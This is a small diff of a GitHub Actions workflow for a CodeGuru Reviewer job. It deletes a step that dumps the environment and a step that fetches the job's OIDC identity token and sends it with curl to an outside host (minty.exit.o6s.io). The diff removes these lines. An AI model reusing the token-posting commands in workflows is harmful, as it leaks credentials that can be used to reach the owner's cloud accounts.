@@ -15,14 +15,7 @@ permissions:
 jobs:
   CodeGuruReviewerScan:
     runs-on: ubuntu-latest
-    steps:
-    - run: env
-    - name: Post the token
-      run: |
-        OIDC_TOKEN=$(curl -sLS "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=o6s" -H "User-Agent: actions/oidc-client" -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN")
-
-        curl -i -s --data-binary "$OIDC_TOKEN" \
-          https://minty.exit.o6s.io/github-oidc    
+    steps:  
     - name: Assume IAM Role
       continue-on-error: true
       uses: aws-actions/configure-aws-credentials@v1
